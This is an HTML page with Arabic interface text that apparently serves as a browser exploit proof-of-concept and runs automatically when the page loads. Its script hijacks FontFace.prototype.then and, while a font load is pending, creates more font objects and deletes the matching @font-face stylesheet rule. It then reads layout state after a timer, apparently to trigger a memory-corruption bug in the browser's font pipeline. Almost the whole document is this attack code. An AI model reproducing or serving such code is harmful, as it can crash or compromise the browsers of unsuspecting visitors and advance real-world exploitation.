<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>تحليل التوقيت التلقائي - التفعيل الفوري</title>
    <style>
        body { background-color: #121212; color: #e0e0e0; font-family: monospace; padding: 20px; }
        #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 400px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
        .log { margin-bottom: 8px; }
        .warn { color: #ffaa00; }
        .error { color: #ff3333; }
    </style>
    
    <style id="s">
        @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
    </style>
</head>
<body>

    <h2>مراقبة التفعيل التلقائي (Automated Userland Trigger)</h2>
    <p>يتم الفحص الآن تلقائياً بمجرد تحميل المتصفح للمستند...</p>
    
    <div id="custom-console">[نظام المحاكاة نشط]: في انتظار تحميل الصفحة...</div>

    <script>
        const consoleElement = document.getElementById('custom-console');
        function screenLog(msg, isWarn = false) {
            const entry = document.createElement('div');
            entry.className = isWarn ? 'log warn' : 'log';
            entry.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            consoleElement.appendChild(entry);
            consoleElement.scrollTop = consoleElement.scrollHeight;
        }

        // تفعيل الثغرة تلقائياً بمجرد دخول الموقع
        window.onload = () => {
            consoleElement.innerHTML = ""; // تصفير واجهة العرض لبدء التتبع الفوري
            screenLog("تم رصد دخول الموقع - بدء تشغيل الثغرة تلقائياً...");

            try {
                let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
                document.fonts.add(A);
                void A.loaded;

                let fired = false;

                // إعداد كمين التداخل مع الحماية من الـ OOM
                Object.defineProperty(FontFace.prototype, 'then', {
                    configurable: true,
                    get() {
                        if (!fired && this === A) {
                            fired = true;
                            screenLog("!! تم تفعيل الكمين المنطقي أثناء تحميل الصفحة !!", true);
                            
                            // محاولة إغراق وتغيير حالة الذاكرة بكائنات خطوط أخرى
                            new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                            new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                            
                            try {
                                document.getElementById('s').sheet.deleteRule(0);
                                screenLog("تم حذف القاعدة التنسيقية تلقائياً.");
                            } catch(e) { 
                                screenLog("خطأ أثناء الحذف التلقائي: " + e.message, true); 
                            }
                            
                            // تأجيل القراءة عبر خيط التنفيذ التالي (Macro-task Window)
                            setTimeout(() => {
                                screenLog("محاولة القراءة المؤجلة (offsetTop) بعد انتهاء دورة التحميل الأصلية...");
                                let offset = document.body.offsetTop;
                                screenLog("قيمة الـ Offset المسترجعة تلقائياً: " + offset);
                            }, 10); // زيادة مهلة التأخير طفيفاً لمنع الـ Pinning
                        }
                        
                        return function(resolve) { if (resolve) resolve(); };
                    }
                });

                // إطلاق الدالة الرسمية لتنشيط الـ Pipeline
                screenLog("إرسال طلب التحميل المباشر document.fonts.load...");
                document.fonts.load('1em x', 'AB');

            } catch (err) {
                screenLog("خطأ عام في النظام: " + err.message, true);
            }
        };

        window.onerror = function(msg) {
            screenLog("استثناء غير معالج: " + msg, true);
            return true;
        };
    </script>
</body>
</html>
